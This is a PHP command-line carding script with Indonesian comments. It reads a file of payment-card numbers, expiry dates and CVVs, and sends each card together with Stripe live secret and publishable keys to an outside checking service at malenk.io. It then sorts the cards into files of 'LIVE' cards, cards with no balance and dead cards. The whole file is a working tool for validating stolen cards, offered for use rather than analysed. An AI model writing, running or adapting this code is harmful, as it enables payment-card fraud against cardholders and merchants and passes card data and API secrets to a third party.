<?php
date_default_timezone_set("Asia/Jakarta");
require("RollingCurl/RollingCurl.php");
$config = [
        ['sk_live' => 'SK_LIVE PUNYA LO',
        'pk_live' => 'PK_LIVE PUNYA LO']
        // sk_live lagi disini kalo mau rotate!
      ];
$initiateRepeat = 0;
do {
  $pathFile = input("Input List CC ");
  if(empty($pathFile)) {
    $initiateRepeat = 1;
  } else if(!file_exists($pathFile)) {
    $initiateRepeat = 1;
  } else {
    $initiateRepeat = 0;
  }
} while($initiateRepeat);


$delimeter = explode("\n", trim(file_get_contents($pathFile)));
$checkTotal = 1;
$amountList = count($delimeter);
$urlList = array();
foreach($delimeter as $formList) {
  $rand = array_rand($config, 1);
  $formList = urlencode(trim($formList));
  $urlList[] = "http://malenk.io/fhAPICustom/?format=".trim($formList)."&sk_live=".$config[$rand]['sk_live']."&pk_live=".$config[$rand]['pk_live'];
}

$reqPerSec = "2";
$rollingCurl = new \RollingCurl("callback");
$rollingCurl->window_size = $reqPerSec;

foreach($urlList as $url) {
  $request = new RollingCurlRequest($url);
  $rollingCurl->add($request);
}

$rollingCurl->execute();


function callback($response, $info) {
  global $checkTotal, $amountList;
  $format = json_decode($response,1)['card']['number']."|".json_decode($response,1)['card']['exp_month']."|".json_decode($response,1)['card']['exp_year']."|".json_decode($response,1)['card']['cvv'];
  if(json_decode($response,1)['status'] == "LIVE") {
      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." - ".@json_decode($response,1)['bin_info']." => LIVE\n";
      file_put_contents("LiveCC.txt", $format." ".json_decode($response,1)['bin_info']."\n", FILE_APPEND);
      sleep(5);
  } else {
      if(json_decode($response,1)['status'] == "UNKNOWN") {
        file_put_contents("unk.txt", $format."\n", FILE_APPEND);
        echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => ".json_decode($response,1)['status']." ".json_decode($response,1)['message']."\n";
         sleep(15);
      } else {
        if(@json_decode($response, 1)['decline_code'] == 'transaction_not_allowed') {
            file_put_contents("unknown_not_supported.txt", trim($format).PHP_EOL, FILE_APPEND);
        } else if(@json_decode($response,1)['decline_code'] == 'insufficient_funds') {
            file_put_contents("die_no_balance.txt", trim($format).PHP_EOL, FILE_APPEND);
        } else {
            file_put_contents("die.txt", trim($format).PHP_EOL, FILE_APPEND);
        }
        echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => DIE ".json_decode($response,1)['message']." (".@json_decode($response,1)['decline_code'].")\n";
  }
  $checkTotal++;
}

}

function input($text) {
  echo $text.": ";
  $a = trim(fgets(STDIN));
  return $a;
}
?>
